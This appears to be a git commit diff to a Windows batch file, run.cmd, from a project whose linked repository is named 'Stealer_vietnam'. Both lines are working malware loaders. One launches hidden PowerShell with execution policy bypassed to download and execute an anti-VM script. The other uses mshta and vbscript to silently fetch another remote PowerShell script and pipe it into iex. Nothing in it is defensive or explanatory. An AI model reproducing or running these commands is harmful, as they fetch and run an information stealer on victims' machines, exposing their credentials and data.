d9475d2a044f653dd18e6fe234ba5010c6ca56b3
43a1723 <hai1723notgay@gmail.com>
2024-06-21 09:56:47 +0700

    Update run.cmd

--- run.cmd
+++ run.cmd
@@ -1,2 +1,2 @@
-powershell -Command -WindowStyle Hidden "iex (iwr -useb 'https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/antivm.bat.ps1')"
+powershell -Command -Win Hidden -NoP -ExecutionPolicy Bypass "iex (iwr -useb 'https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/antivm.bat.ps1')"
 mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; $t -replace 'skid', 'skid' | iex",0))
